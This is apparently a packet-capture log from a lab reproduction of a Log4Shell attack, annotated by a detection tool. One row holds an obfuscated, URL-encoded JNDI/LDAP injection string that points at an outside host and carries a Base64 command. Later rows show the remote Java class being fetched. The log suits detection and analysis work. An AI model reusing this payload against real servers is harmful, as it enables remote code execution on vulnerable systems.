no,time,timestamp,src_ip,dst_ip,src_port,dst_port,protocol,length,info
4,0.000270,2021-12-14T16:06:47.860852Z,172.17.0.1,172.17.0.2,37628,8000,HTTP,422,GET /test?q=%24%7B%24%7Blower%3Aj%7D%24%7Bupper%3An%7D%24%7Blower%3Ad%7D%24%7Bupper%3Ai%7D%3A%24%7Blower%3Al%7Dd%24%7Blower%3Aa%7Dp%3A%2F%2F34.91.73.37%3A1389%2FBasic%2FCommand%2FBase64%2FcGluZyAtYyAxMCAxLjEuMS4x%7D HTTP/1.1; URI query contains URL-encoded Log4Shell candidate
9,0.003547,2021-12-14T16:06:47.864129Z,172.17.0.2,34.91.73.37,46192,1389,LDAP,80,LDAP/TCP payload
11,0.004724,2021-12-14T16:06:47.865306Z,34.91.73.37,172.17.0.2,1389,46192,LDAP,80,LDAP/TCP payload
13,0.005267,2021-12-14T16:06:47.865849Z,172.17.0.2,34.91.73.37,46192,1389,LDAP,179,LDAP/TCP payload; contains /Base64/ command path
15,0.008083,2021-12-14T16:06:47.868665Z,34.91.73.37,172.17.0.2,1389,46192,LDAP,267,LDAP/TCP payload; contains /Base64/ command path; contains javaCodeBase/reference
17,0.008099,2021-12-14T16:06:47.868681Z,34.91.73.37,172.17.0.2,1389,46192,LDAP,80,LDAP/TCP payload
22,0.009705,2021-12-14T16:06:47.870287Z,172.17.0.2,34.91.73.37,54276,8080,HTTP,245,GET /ExploitjTcbuJ4P70.class HTTP/1.1; URI query contains URL-encoded Log4Shell candidate; Java class download request
24,0.011644,2021-12-14T16:06:47.872226Z,34.91.73.37,172.17.0.2,8080,54276,HTTP,144,HTTP/1.1 200 OK
26,0.012053,2021-12-14T16:06:47.872635Z,34.91.73.37,172.17.0.2,8080,54276,TCP,1283,ACK
28,0.013782,2021-12-14T16:06:47.874364Z,172.17.0.2,34.91.73.37,46192,1389,LDAP,102,LDAP/TCP payload
183,0.076643,2021-12-14T16:06:47.937225Z,172.17.0.2,172.17.0.1,8000,37628,HTTP,142,HTTP/1.1 200 OK
185,0.076740,2021-12-14T16:06:47.937322Z,172.17.0.2,172.17.0.1,8000,37628,TCP,86,ACK
